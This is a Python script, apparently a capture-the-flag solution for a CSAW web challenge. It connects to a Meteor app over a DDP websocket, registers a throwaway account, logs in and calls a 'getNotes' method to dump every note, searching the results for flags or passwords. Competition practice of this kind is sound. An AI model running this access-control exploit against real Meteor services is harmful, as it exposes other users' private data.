import requests
import json
import websocket
import random
import string
import time

def random_id(length=17):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def login_meteor():
    # First create an account
    username = f"hacker_{random_id(8)}"
    password = "hackme123"

    # Register account using accounts-password package
    register_data = {
        "msg": "method",
        "method": "createUser",
        "params": [{
            "username": username,
            "password": password,
            "profile": {}
        }],
        "id": random_id()
    }

    ws = websocket.create_connection("ws://web.chal.csaw.io:5000/sockjs/websocket")

    # Send connect
    connect_msg = {
        "msg": "connect",
        "version": "1",
        "support": ["1"]
    }
    ws.send(json.dumps(connect_msg))
    result = ws.recv()
    print(f"Connect response: {result}")

    # Send registration
    ws.send(json.dumps(register_data))
    result = ws.recv()
    print(f"Register response: {result}")

    # Now login
    login_data = {
        "msg": "method",
        "method": "login",
        "params": [{
            "user": {"username": username},
            "password": password
        }],
        "id": random_id()
    }

    ws.send(json.dumps(login_data))
    result = ws.recv()
    print(f"Login response: {result}")

    # Request all notes
    notes_data = {
        "msg": "method",
        "method": "getNotes",
        "params": [],
        "id": random_id()
    }
    ws.send(json.dumps(notes_data))

    while True:
        try:
            result = ws.recv()
            print(f"Notes response: {result}")
            if "flag{" in result or "password" in result.lower():
                print("Found interesting data!")
        except:
            break

    ws.close()

if __name__ == "__main__":
    login_meteor()

